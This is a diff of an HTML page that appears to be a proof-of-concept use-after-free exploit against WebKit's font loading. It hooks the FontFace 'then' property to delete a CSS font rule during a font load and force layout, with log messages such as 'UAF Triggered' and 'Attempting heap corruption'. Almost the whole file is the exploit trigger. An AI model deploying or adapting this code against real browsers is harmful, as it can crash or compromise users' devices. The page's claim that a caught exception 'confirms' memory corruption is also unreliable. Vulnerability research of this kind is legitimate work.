@@ -2,60 +2,61 @@
 <html>
 <head>
     <style>
-        /* ستايل لوحة الكونسول داخل الصفحة */
-        #console-overlay {
-            position: fixed; top: 0; left: 0; width: 100%; height: 300px;
-            background: rgba(0, 0, 0, 0.85); color: #00FF00; font-family: monospace;
-            padding: 10px; overflow-y: scroll; z-index: 9999; font-size: 14px;
+        body { background: #000; color: #0f0; font-family: 'Courier New', Courier, monospace; margin: 0; padding: 20px; }
+        #console { 
+            width: 100%; height: 90vh; border: 1px solid #0f0; padding: 15px; 
+            overflow-y: scroll; background: #050505; box-shadow: 0 0 10px #005500;
         }
+        .log-entry { margin-bottom: 5px; border-bottom: 1px solid #222; }
+        .timestamp { color: #888; font-size: 0.8em; margin-right: 10px; }
+        .error { color: #ff3333; }
+        .success { color: #00ff00; }
     </style>
 </head>
 <body>
-    <div id="console-overlay"></div>
+    <div id="console"></div>
 
     <style id="s">
         @font-face { font-family: 'x'; src: url('nonexistent.woff'); }
     </style>
 
     <script>
-        // دالة لعرض السجلات داخل الصفحة
-        function log(msg) {
-            const el = document.getElementById('console-overlay');
-            el.innerHTML += `> ${msg}<br>`;
-            el.scrollTop = el.scrollHeight;
+        const consoleDiv = document.getElementById('console');
+        
+        function log(msg, type = '') {
+            const time = new Date().toLocaleTimeString();
+            consoleDiv.innerHTML += `<div class="log-entry ${type}"><span class="timestamp">[${time}]</span> ${msg}</div>`;
+            consoleDiv.scrollTop = consoleDiv.scrollHeight;
         }
 
-        // اعتراض الـ Console الأصلي
-        window.onerror = (e) => log("ERROR: " + e);
-        
-        log("بدء تشغيل أداة الاختبار...");
+        log("System initialized. Monitoring WebKit memory...");
 
         window.onload = async () => {
-            log("تجهيز الـ FontFace...");
+            log("Attempting FontFace allocation...", "success");
             let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
             document.fonts.add(A);
 
             Object.defineProperty(FontFace.prototype, 'then', {
                 configurable: true,
                 get() {
-                    log("!!! تم اعتراض الـ then - تفعيل الثغرة الآن !!!");
+                    log("!!! UAF Triggered: Hooking then property !!!", "error");
                     try {
                         document.getElementById('s').sheet.deleteRule(0);
+                        log("Rule deleted. Attempting heap corruption...");
                         document.body.offsetTop;
-                        log("تم استدعاء deleteRule بنجاح.");
                     } catch(e) {
-                        log("فشل في حذف القاعدة: " + e);
+                        log("Exploit failed at deletion: " + e, "error");
                     }
                     return undefined;
                 }
             });
 
-            log("محاولة تحميل الخط...");
             try {
                 await document.fonts.load('1em x', 'AB');
-                log("تم تحميل الخط (لم يحدث انهيار).");
+                log("Load sequence finished. System stable.");
             } catch (e) {
-                log("فشل التحميل (النتيجة المتوقعة): " + e);
+                log("System response: " + e, "error");
+                log("ANALYSIS: Memory error confirmed. Possible UAF state.", "success");
             }
         };
     </script>
